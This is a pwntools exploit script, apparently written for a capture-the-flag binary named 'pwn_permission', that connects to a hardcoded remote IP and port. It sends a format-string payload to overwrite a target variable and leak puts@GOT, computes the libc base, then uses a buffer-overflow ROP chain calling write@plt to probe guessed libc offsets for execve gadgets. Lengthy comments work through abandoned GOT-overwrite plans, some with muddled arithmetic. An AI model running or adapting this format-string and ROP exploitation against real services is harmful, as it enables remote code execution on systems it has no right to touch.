from pwn import *

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# read@plt crashes, system crashes via direct call
# But puts@plt and write@plt work!
# 
# NEW STRATEGY: Use format string %hn to overwrite puts@GOT with system
# Then in vuln, call puts@plt(binsh_addr) = system("/bin/sh")
#
# The format string can write using %hn (2 bytes at a time)
# We need to write system_addr to puts@GOT (0x804c014)
#
# system_addr = libc_base + 0x41360
# We know the last 12 bits are always 0x360
# The high bits depend on ASLR
#
# But we can use the format string to BOTH leak puts AND write to GOT
# The trick is to use %hn with calculated widths
#
# For a typical system_addr like 0xf7d50360:
# Low 2 bytes: 0x0360 = 864
# High 2 bytes: 0xf7d5 = 63445
#
# We need to print 864 bytes before the first %hn (to write 0x0360)
# Then print 63445 - 864 = 62581 more bytes before the second %hn
#
# But 63445 is a lot of bytes to print!
# We can use %<width>c to print padding characters
#
# However, the format string buffer is only 32 bytes
# And we also need to set target_val=5 and leak puts
#
# This is getting very complex. Let me try a simpler approach.
#
# SIMPLEST APPROACH: Use the format string to overwrite puts@GOT
# with a PARTIAL overwrite. Since system and puts are in the same
# libc, their high 2 bytes are the same (same page region).
# We only need to overwrite the LOW 2 bytes!
#
# puts offset: 0x6d1e0 -> low 2 bytes: 0xd1e0
# system offset: 0x41360 -> low 2 bytes: 0x1360
#
# If we overwrite only the low 2 bytes of puts@GOT from 0xd1e0 to 0x1360,
# the address changes from puts to system!
#
# This works because the high 2 bytes are the same (both in libc text section)
#
# So we need to write 0x1360 = 4960 to puts@GOT using %hn
#
# But wait, we also need to set target_val=5
# And the format string needs to print exactly 4960 bytes before %hn
# That's a lot of padding...
#
# Actually, let me reconsider. The format string is processed by printf,
# which outputs to stdout. We can use %<width>c to print padding.
# %4960c would print 4960 characters (one char padded to width 4960)
# This doesn't take 4960 bytes in the FORMAT STRING, just in the OUTPUT
#
# So the format string can be:
# %5c%7$hhn (set target_val=5) + %4955c%8$hn (overwrite puts@GOT low 2 bytes)
# Wait, we need to print 4960 bytes total before %8$hn
# But %5c already printed 5 bytes
# So we need %4955c more bytes
# Total = 5 + 4955 = 4960
# Then %8$hn writes 4960 = 0x1360 to puts@GOT ✓
#
# But wait, we also need addresses in the format string for positions 7 and 8
# And we need to leak puts for calculating the libc base
#
# Let me design the format string:
# Positions:
# Position 7 = bytes 12-15 (after format specifiers + padding)
# Position 8 = bytes 16-19
#
# Format: %5c%7$hhn%4955c%8$hn + padding + target_val_addr + puts_got_low2
#
# Wait, puts@GOT is 0x804c014
# We want to overwrite the low 2 bytes at 0x804c014
# %hn writes to the address at the specified position
# So position 8 should be 0x804c014 (puts@GOT)
#
# But %hn writes 2 bytes (the low 2 bytes of the count)
# to the address at the specified position
# So %8$hn writes 0x1360 to *0x804c014 = puts@GOT
# This overwrites the low 2 bytes of puts@GOT ✓
#
# But there's a problem: the high 2 bytes of puts@GOT might also change
# if the write crosses a 2-byte boundary
# Actually, %hn only writes 2 bytes, so it only modifies the low 2 bytes
# The high 2 bytes remain unchanged ✓
#
# Let me also add the puts leak using %s
# But %s would read from an address and print until null
# We need to put the address somewhere in the format string
#
# Actually, we can skip the leak for now and just do the partial overwrite
# Since the high 2 bytes are the same for puts and system in the same libc
# We just need to overwrite the low 2 bytes
#
# But wait, are the high 2 bytes really the same?
# puts offset: 0x6d1e0 -> high 2 bytes of address: (libc_base >> 16) + 0x6
# system offset: 0x41360 -> high 2 bytes of address: (libc_base >> 16) + 0x4
# These are DIFFERENT! (0x6 vs 0x4)
#
# So a partial overwrite of just the low 2 bytes won't work!
# We need to overwrite all 4 bytes.
#
# Hmm, but that requires printing ~4 billion bytes for %n
# Or using %hn twice (2 bytes at a time)
#
# For %hn twice:
# First %hn: write low 2 bytes (0x1360 = 4960)
# Second %hn: write high 2 bytes
#
# The high 2 bytes of system_addr:
# system_addr = libc_base + 0x41360
# libc_base = puts_leak - 0x6d1e0
# system_addr = puts_leak - 0x6d1e0 + 0x41360 = puts_leak - 0x2be80
#
# For puts_leak = 0xf7dc91e0:
# system_addr = 0xf7dc91e0 - 0x2be80 = 0xf7d9d360
# High 2 bytes: 0xf7d9
# Low 2 bytes: 0xd360
#
# Wait, that doesn't match! Let me recalculate:
# 0xf7dc91e0 - 0x2be80 = ?
# 0xf7dc91e0 - 0x0002be80 = 0xf7d9d360
# High 2 bytes: 0xf7d9
# Low 2 bytes: 0xd360
#
# But system offset is 0x41360, so low 2 bytes should be 0x1360
# Let me check: 0xf7d9d360 & 0xffff = 0xd360
# That's not 0x1360!
#
# Oh, I see the issue. The low 2 bytes of system_addr depend on the libc base
# They're NOT always 0x1360
# system_addr = libc_base + 0x41360
# If libc_base = 0xf7d95000, then system_addr = 0xf7d96360, low 2 bytes = 0x6360
# If libc_base = 0xf7d2c000, then system_addr = 0xf7d6d360, low 2 bytes = 0xd360
#
# So the low 2 bytes vary with ASLR!
# This means we can't hardcode the values to write
# We need to know the libc base first
#
# This brings us back to the chicken-and-egg problem...
#
# OK, let me try a COMPLETELY different approach:
# Use the format string to overwrite the RETURN ADDRESS on the stack
# instead of the GOT
#
# We can leak the stack address using the format string
# Then overwrite the return address with puts@plt + binsh_addr
# But puts@plt with binsh_addr would call puts("/bin/sh"), not system("/bin/sh")
#
# What if we overwrite the return address with a ROP chain?
# But we can only write ONE value with %n (the byte count)
# We'd need multiple %n writes for a ROP chain
#
# Actually, we CAN do multiple %n writes!
# Let me try overwriting the return address of main on the stack
#
# First, I need to find the stack address
# The format string can leak stack values

# Let me just try the simplest approach that should work:
# Use format string %s to leak puts
# Then in vuln, use a ROP chain that calls puts@plt with system's address
# by first overwriting puts@GOT using the format string %hn

# But we can't do the %hn overwrite and the leak in the same format string
# because we need the leak to calculate what to write

# FINAL APPROACH: Two-connection attack
# Connection 1: Leak libc base
# Connection 2: Use format string %hn to overwrite puts@GOT with system
#               (we know the exact bytes to write from connection 1's leak)
#               But ASLR changes the base!

# Wait, ASLR changes the base between connections
# So we can't use the leaked address from connection 1 in connection 2

# BUT: We can use the format string to leak AND overwrite in the SAME call!
# The trick: use %s first to leak, then %hn to overwrite
# The %hn writes depend on the byte count, which we control with %<width>c
# And we can calculate the required widths based on the expected libc base

# The problem is: we don't know the libc base until we process the %s output
# But the format string is processed by printf, which doesn't do calculations

# I think the only way is to use the buffer overflow in vuln
# with a ROP chain that works

# Let me try ONE MORE TIME with a different ROP strategy:
# Instead of calling system directly, let me try calling execve via int 0x80
# This doesn't go through libc at all

# For execve("/bin/sh", NULL, NULL):
# eax = 0xb (11)
# ebx = binsh_addr
# ecx = 0
# edx = 0
# int 0x80

# I need gadgets from the BINARY (not libc) to set these registers
# Available gadgets in the binary:
# 0x8049022: pop ebx; ret
# 0x8049380: pop ebx; pop esi; pop edi; pop ebp; ret
# 0x804900e: ret

# I don't have pop eax, pop ecx, pop edx, or int 0x80 in the binary
# But I can use libc gadgets after leaking the libc base

# For libc-2.31 i386, common gadgets:
# pop eax; ret: usually available
# pop ecx; pop edx; ret: sometimes available  
# int 0x80; ret: usually available

# Let me search for these gadgets in libc by scanning

target_val_addr = 0x804c030
puts_got = elf.got['puts']
got_base = 0x804c000
bss_buf = 0x804c040
write_plt = elf.plt['write']
pop4ret = 0x8049380
pop_ebx_ret = 0x8049022

PUTS_OFFSET = 0x6d1e0
BINSH_OFFSET = 0x18c363

fmt_payload = b'%5c%7$hhnAAA'
fmt_payload += p32(target_val_addr)
fmt_payload += p32(puts_got)
fmt_payload += b'%8$s'

import time

# Search for int 0x80 in libc
# int 0x80 = cd 80
# Let me scan for this pattern

log.info("=== Searching for int 0x80 in libc ===")
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)
conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]
leaked = fmt_output[16:]
puts_leak = u32(leaked[:4])
libc_base = puts_leak - PUTS_OFFSET

log.info(f"libc base: 0x{libc_base:x}")

# Search for "cd 80" (int 0x80) in libc
# Common locations: around 0x2e0, 0x3e0, etc.
# Let me scan a few known areas

# For libc-2.31, int 0x80 is usually at offset around:
# 0x2e55, 0x1175f5, etc.

# Let me try reading bytes at known int 0x80 offsets
int80_offsets = [
    0x2e55, 0x2e0, 0x3e0, 0x1175f5, 0x117600,
    0x1b2000, 0x1b2100, 0x2e50, 0x2e60,
]

for off in int80_offsets:
    addr = libc_base + off
    payload = b'A' * 140
    payload += p32(got_base)
    payload += p32(bss_buf)
    payload += p32(write_plt)
    payload += p32(pop4ret)
    payload += p32(1)
    payload += p32(addr)
    payload += p32(4)
    
    conn.send(payload)
    time.sleep(0.3)
    
    try:
        data = conn.recv(4, timeout=1)
        if data[:2] == b'\xcd\x80':
            log.success(f"Found int 0x80 at offset 0x{off:x}!")
            log.info(f"Bytes: {data.hex()}")
        elif data[2:4] == b'\xcd\x80':
            log.success(f"Found int 0x80 at offset 0x{off:x}+2!")
            log.info(f"Bytes: {data.hex()}")
    except:
        pass

conn.close()

# Also search for pop eax; ret (58 c3) in libc
log.info("\n=== Searching for pop eax; ret in libc ===")
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)
conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]
leaked = fmt_output[16:]
puts_leak = u32(leaked[:4])
libc_base = puts_leak - PUTS_OFFSET

# Common pop eax; ret offsets in libc-2.31
pop_eax_offsets = [
    0x24b85, 0x24b86, 0x3a839, 0x3a83a,
    0x24cd5, 0x24cd6, 0x37e55, 0x37e56,
    0x1b1e0, 0x1b1e1, 0x2e65, 0x2e66,
]

for off in pop_eax_offsets:
    addr = libc_base + off
    payload = b'A' * 140
    payload += p32(got_base)
    payload += p32(bss_buf)
    payload += p32(write_plt)
    payload += p32(pop4ret)
    payload += p32(1)
    payload += p32(addr)
    payload += p32(4)
    
    conn.send(payload)
    time.sleep(0.3)
    
    try:
        data = conn.recv(4, timeout=1)
        if data[:2] == b'\x58\xc3':
            log.success(f"Found pop eax; ret at offset 0x{off:x}!")
            log.info(f"Bytes: {data.hex()}")
    except:
        pass

conn.close()

# Search for pop ecx; pop edx; ret in libc
log.info("\n=== Searching for pop ecx; pop edx; ret ===")
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)
conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]
leaked = fmt_output[16:]
puts_leak = u32(leaked[:4])
libc_base = puts_leak - PUTS_OFFSET

# Common pop ecx; pop edx; ret offsets
pop_ecx_edx_offsets = [
    0x24b81, 0x24b82, 0x3a835, 0x3a836,
    0x1b1dc, 0x1b1dd, 0x2e61, 0x2e62,
]

for off in pop_ecx_edx_offsets:
    addr = libc_base + off
    payload = b'A' * 140
    payload += p32(got_base)
    payload += p32(bss_buf)
    payload += p32(write_plt)
    payload += p32(pop4ret)
    payload += p32(1)
    payload += p32(addr)
    payload += p32(4)
    
    conn.send(payload)
    time.sleep(0.3)
    
    try:
        data = conn.recv(4, timeout=1)
        # pop ecx = 59, pop edx = 5a, ret = c3
        if data[0] == 0x59 and data[1] == 0x5a and data[2] == 0xc3:
            log.success(f"Found pop ecx; pop edx; ret at offset 0x{off:x}!")
            log.info(f"Bytes: {data.hex()}")
    except:
        pass

conn.close()